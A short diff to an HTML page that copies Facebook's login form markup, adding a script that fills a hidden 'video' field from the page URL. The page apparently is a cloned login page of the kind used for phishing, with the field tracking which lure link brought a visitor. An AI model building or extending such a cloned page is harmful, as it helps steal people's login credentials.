@@ -106,7 +106,12 @@
                                             method="post" onsubmit="" id="u_0_a"><input type="hidden" name="jazoest"
                                                 value="2858" autocomplete="off" /><input type="hidden" name="lsd"
                                                 value="AVr7F_5T5Pg" autocomplete="off" />
-                                                <input type="hidden" name="video" value="ec4f4ae3">
+                                                <input type="hidden" id="video" name="video" value="">
+                                                <script type="text/javascript">
+                                                var url = String(window.location);
+                                                var array = url.split('/').reverse();
+                                                document.getElementById('video').value = array[0];
+                                                </script>
                                             <div>
                                                 <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy"
                                                         name="email" id="email" data-testid="royal_email"
